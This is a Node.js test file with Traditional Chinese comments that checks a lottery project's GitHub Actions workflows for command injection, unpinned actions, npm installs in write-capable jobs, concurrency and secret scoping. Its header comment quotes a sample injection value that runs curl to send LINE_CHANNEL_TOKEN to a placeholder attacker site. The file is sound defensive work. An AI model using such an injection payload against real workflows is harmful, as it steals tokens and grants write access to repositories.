/**
 * 工作流程安全檢查
 *
 * ── 這個測試存在的原因 ─────────────────────────────────────
 *
 * 原本五個工作流程都把使用者輸入直接插進 shell 指令：
 *
 *     run: git commit -m "作廢：${{ inputs.reason }}"
 *
 * ${{ }} 是 GitHub 在 shell 執行「之前」做的文字替換，使用者輸入會直接
 * 成為指令的一部分。把理由填成下面這種內容即可執行任意指令：
 *
 *     "; curl -d "$LINE_CHANNEL_TOKEN" https://攻擊者網站; echo "
 *
 * 外洩的不只是 LINE 權杖——同一個環境裡還有具備 contents:write 的
 * GITHUB_TOKEN。一個照設計「只能發動抽籤、不能改任何資料」的
 * DRAW_OPERATOR 可藉此取得完整寫入權並偽造抽籤紀錄，
 * 使 SPEC §8.2 的整套權限設計失效。
 *
 * 正確作法是以 env: 傳遞、在 shell 中用 "$VAR" 引用：環境變數只會被
 * 展開為字串，不會被當成程式碼。
 *
 * 本測試防止日後有人為了方便而改回去。
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const WF_DIR = fileURLToPath(new URL('../../.github/workflows/', import.meta.url));
const files = readdirSync(WF_DIR).filter((f) => f.endsWith('.yml'));

/** 取出所有 run: 區塊的內容 */
function runBlocks(text) {
  const lines = text.split('\n');
  const blocks = [];
  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(/^(\s*)run:\s*(\|-?|>-?)?\s*(.*)$/);
    if (!m) continue;
    const indent = m[1].length;
    const body = [];
    if (m[3]) body.push({ line: i + 1, text: m[3] });
    for (let j = i + 1; j < lines.length; j++) {
      const l = lines[j];
      if (l.trim() === '') { body.push({ line: j + 1, text: '' }); continue; }
      const ind = l.match(/^(\s*)/)[1].length;
      if (ind <= indent) break;
      body.push({ line: j + 1, text: l });
    }
    blocks.push(body);
  }
  return blocks;
}

describe('工作流程安全', () => {
  test('至少找得到工作流程檔（避免路徑錯誤導致測試空轉通過）', () => {
    assert.ok(files.length >= 5, `只找到 ${files.length} 個工作流程檔，路徑可能有誤`);
  });

  test('run: 區塊不得含 ${{ }} 插值（指令注入）', () => {
    const bad = [];
    for (const f of files) {
      const text = readFileSync(join(WF_DIR, f), 'utf8');
      for (const block of runBlocks(text)) {
        for (const { line, text: l } of block) {
          if (l.includes('${{')) bad.push(`${f}:${line}　${l.trim()}`);
        }
      }
    }
    assert.deepEqual(
      bad, [],
      '下列 run: 區塊直接插入了 ${{ }}，構成指令注入。\n' +
      '請改以 env: 傳遞並在 shell 中用 "$VAR" 引用：\n  ' + bad.join('\n  ')
    );
  });

  test('第三方 action 一律以 commit SHA 釘選，不得使用浮動標籤', () => {
    const bad = [];
    for (const f of files) {
      const text = readFileSync(join(WF_DIR, f), 'utf8');
      for (const [i, l] of text.split('\n').entries()) {
        const m = l.match(/uses:\s*([^\s#]+)/);
        if (!m) continue;
        const ref = m[1];
        if (ref.startsWith('./')) continue; // 本 repo 內的 action
        const after = ref.split('@')[1] ?? '';
        if (!/^[0-9a-f]{40}$/.test(after)) {
          bad.push(`${f}:${i + 1}　${ref}`);
        }
      }
    }
    assert.deepEqual(bad, [], '下列 action 未以 40 位 commit SHA 釘選：\n  ' + bad.join('\n  '));
  });

  test('會寫入資料的流程不得安裝第三方套件', () => {
    // 這些 job 具備 contents:write 且會推送資料。在其中執行 npm ci
    // 等於把供應鏈風險引入可寫入的環節——一個被汙染的套件即可竄改 data/。
    // 完整的 BLS 稽核由 audit.yml 於推送後自動觸發，該 job 為唯讀。
    const bad = [];
    for (const f of ['draw.yml', 'redraw.yml', 'void.yml', 'amend.yml', 'config.yml']) {
      const text = readFileSync(join(WF_DIR, f), 'utf8');
      for (const block of runBlocks(text)) {
        for (const { line, text: l } of block) {
          const code = l.split('#')[0]; // 略過註解
          if (/npm\s+(ci|install)/.test(code)) bad.push(`${f}:${line}　${l.trim()}`);
        }
      }
    }
    assert.deepEqual(bad, [],
      '下列可寫入資料的流程執行了 npm 安裝：\n  ' + bad.join('\n  '));
  });

  test('會寫入資料的流程都必須序列化執行', () => {
    for (const f of ['draw.yml', 'redraw.yml', 'void.yml', 'amend.yml', 'config.yml']) {
      const text = readFileSync(join(WF_DIR, f), 'utf8');
      assert.match(text, /concurrency:/, `${f} 缺少 concurrency 設定`);
      assert.match(text, /group:\s*lottery/, `${f} 未與抽籤共用同一序列，可能同時修改籤筒`);
      assert.match(text, /cancel-in-progress:\s*false/,
        `${f} 允許取消進行中的作業，可能在承諾與開籤之間被中斷`);
    }
  });

  test('Secret 只出現在需要它的步驟，不設在 job 層', () => {
    // job 層的 env 會注入該 job 的每一個步驟，包含執行第三方 action 的步驟。
    // 縮小範圍可減少外洩面。
    const text = readFileSync(join(WF_DIR, 'draw.yml'), 'utf8');
    const jobEnvSection = text.split(/^\s{4}steps:/m)[0];
    assert.ok(
      !jobEnvSection.includes('secrets.'),
      'draw.yml 的 job 層 env 不應含 secrets，請移至實際需要的步驟'
    );
    assert.match(text, /LINE_CHANNEL_TOKEN:\s*\$\{\{\s*secrets\./,
      'draw.yml 應在開籤步驟注入 LINE_CHANNEL_TOKEN');
  });
});
